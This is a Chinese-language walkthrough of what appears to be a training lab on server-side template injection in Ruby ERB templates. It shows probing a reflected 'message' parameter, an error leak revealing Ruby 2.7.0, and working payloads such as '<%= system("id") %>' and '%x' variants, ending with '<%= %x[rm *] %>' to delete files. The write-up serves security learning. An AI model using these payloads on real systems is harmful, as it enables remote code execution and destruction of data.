# 实验：基础服务器端模板注入

由于 ERB 模板的不安全构造，本实验存在服务器端模板注入漏洞。

为了解决本实验，请查阅 ERB 文档以了解如何执行任意代码，然后从 Carlos 的主目录中删除 `morale.txt` 文件。

## 步骤

探测
- 查看部分商品时，服务器响应无库存
    ```http
    GET /product?productId=1 HTTP/2
    ```
    - 响应
        ```http
        HTTP/2 302 Found
        Location: /?message=Unfortunately this product is out of stock
        ```
- 访问重定向端点
    ```http
    GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
    ```
    - 服务器响应
        ```html
        <div>
        Unfortunately this product is out of stock
        </div>
        ```
        - 或存在请求参数值反射行为


测试反射行为
- 设置任意字符串
    ```http
    GET /?message=foo HTTP/2
    ```
    - 服务器响应
        ```html
        <div>
        foo
        </div>
        ```
        - 存在反射

- 设置模糊测试字符串
    ```http
    GET /?message=<@urlencode>{var} ${var} {{var}} <%var%> [% var %]</@urlencode> HTTP/2
    ```
    - 服务器响应 500
        ```html
        <p class=is-warning>
        (erb):1:in `&lt;main&gt;&apos;: undefined local variable or method `var&apos; for main:Object (NameError)
        from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval&apos;
        from /usr/lib/ruby/2.7.0/erb.rb:905:in `result&apos;
        from -e:4:in `&lt;main&gt;&apos;
        </p>
        ```
        - 揭示组件 ruby 2.7.0 版本，erb 模板


查看文档
- erb 模板：执行表达式并替换当前内容
    ```
    <%= Ruby expression -- replace with result %>
    ```
- ruby 执行系统命令
    ```rb
    system("id")
    ```

构造载荷
- 模板命令执行 ruby 系统指令
    `<%= system("id") %>`
    - 服务器响应
        ```log
        uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
        true
        ```
    - 等效命令
        - ```<%= `id` %>```
        - `<%= %x{id} %>`

- 查看当前文件夹内容
    `<%= %x|ls| %>`
    - 服务器响应
        ```log
        morale.txt
        ```
- 当前目录
    `<%= %x(pwd) %>`
    - 即为目标用户目录
        ```log
        /home/carlos
        ```

- 移除文件
    `<%= %x[rm *] %>`
